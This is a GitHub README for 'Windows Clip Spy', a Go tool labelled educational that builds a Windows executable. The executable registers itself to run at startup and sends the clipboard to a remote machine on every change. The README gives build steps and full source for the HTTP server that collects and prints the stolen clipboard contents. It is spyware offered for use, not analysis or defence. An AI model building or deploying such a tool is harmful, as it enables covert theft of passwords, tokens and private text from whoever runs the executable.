# 👓 Windows Clip Spy

### Description 

💻 This is a terminal tool 🔧 which generates an executable to send your clipboard 📋 on each update to another machine ⚙. Made with educational porpuses

## Purpouse 

📖 Learn 

 - how to interact with Windows to start a programm on the OS init
 - get the clipboard on updates
 - create a simple terminal tool from scratch to generate executables
 - make golang background programs

## Technologies used 📘

### Golang  (Go)

#### Pakages  📦:

 1. clipboard (Get the clipboard)
 2. go-autostart (Start on the Windows init)
 3. go-toml (Set and get config vars between the terminal tool and the final executable)

## How to use it

### Prerequisites :
 - go 1.18
#### Clone the repository 📎
    git clone https://github.com/PiterWeb/WindowsClipSpy
    cd WindowsClipSpy
#### Install all the packages 📉

    go mod install
    go mod verify

#### Build the terminal tool 👷‍♂️

    go build .
    # This will generate the tool on an executable at the root folder of the project

#### Use the tool 🔨

Open the executable and introduce the config in the terminal that will appear

#### Listen for the clipboard on the url you specified 🔊

I had prepare the code for the server with the go http package.
This code should be runned on a different folder to work well.

    // <otherfolder>/server.go
    
    package  main
    
    import (
	    "fmt"
	    "io/ioutil"
	    "log"
	    "net/http"
    )
    
    const (
	    Port = "8080"
	    Host = "localhost"
	)
	
	func main() {
		fmt.Println("Server is running on port: ", Port)
		
		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		
			body, err  := ioutil.ReadAll(r.Body)
			
			if err !=  nil {
				log.Fatal(err)
			}
			
			fmt.Println(string(body))
		})
		
		http.ListenAndServe(Host+":"+Port, nil)
	}
	
  ---
  

	cd <otherfolder>
    go mod init github.com/PiterWeb/WindowsClipSpy/server
    go run server.go

